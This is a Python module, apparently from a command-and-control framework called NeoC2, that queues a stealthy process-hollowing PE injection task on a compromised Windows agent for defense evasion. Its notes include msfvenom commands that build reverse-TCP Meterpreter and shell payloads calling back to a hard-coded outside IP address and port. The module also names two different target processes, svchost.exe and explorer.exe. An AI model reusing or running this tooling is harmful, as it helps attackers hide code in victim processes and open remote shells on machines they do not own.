import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "peinject",
        "description": "Stealthily inject a PE file into a target process (svchost.exe) on Windows systems using process hollowing without touching disk",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": [
            "https://github.com/NeoC2",
            "https://www.rapid7.com/docs/msfvenom/"
        ],
        "technique_id": "T1055",  # Process Injection
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PE injection on",
                "required": True
            },
            "pe_file": {
                "description": "Path to the PE file to inject on Neo C2 server.",
                "required": True
            }
        },
        "notes": {
            "msfvenom_examples": [
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f exe",
                "msfvenom -p windows/x64/exec CMD='calc.exe' -f exe",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f exe"
            ]
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    pe_input = options.get("pe_file")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not pe_input:
        return {
            "success": False,
            "error": "PE file is required"
        }

    session.current_agent = agent_id

    try:
        pe_bytes = process_pe_input(pe_input)
    except ValueError as e:
        return {
            "success": False,
            "error": f"Invalid PE format: {str(e)}"
        }

    # Base64 encode the PE file bytes with 'pe' prefix
    encoded_pe = base64.b64encode(pe_bytes).decode('utf-8')

    prefixed_encoded_pe = "pe" + encoded_pe  # Adding 'pe' prefix so agent knows it's a PE file

    command = f"peinject {prefixed_encoded_pe}"

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, command)
        if task_id:
            return {
                "success": True,
                "output": f"[x] PE injection task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "target_process": "explorer.exe"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }


def process_pe_input(pe_input):
    if isinstance(pe_input, bytes):
        return pe_input

    if not isinstance(pe_input, str):
        raise ValueError("PE file input must be a string (file path) or bytes")

    if os.path.isfile(pe_input):
        with open(pe_input, 'rb') as f:
            file_content = f.read()
        if len(file_content) == 0:
            raise ValueError(f"PE file is empty: {pe_input}")
        return file_content

    if is_base64(pe_input):
        try:
            if pe_input.startswith('pe'):
                pe_input = pe_input[2:]
            decoded = base64.b64decode(pe_input)
            return decoded
        except Exception:
            pass  # Not valid base64, continue to other formats

    # If it's a hex string, convert it
    clean_hex = pe_input.replace('0x', '').replace(',', '').replace('\\', '').replace(' ', '').replace('\n', '').replace('\t', '')

    if re.match(r'^[0-9a-fA-F]+$', clean_hex) and len(clean_hex) % 2 == 0:
        try:
            result = bytes.fromhex(clean_hex)
            return result
        except ValueError:
            raise ValueError("Invalid hex string for PE file")

    return pe_input.encode('utf-8')


def is_base64(s):
    try:
        if len(s) % 4 != 0:
            return False

        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        decoded = base64.b64decode(s)
        encoded = base64.b64encode(decoded).decode('utf-8')
        return encoded == s.strip('=')
    except Exception:
        return False
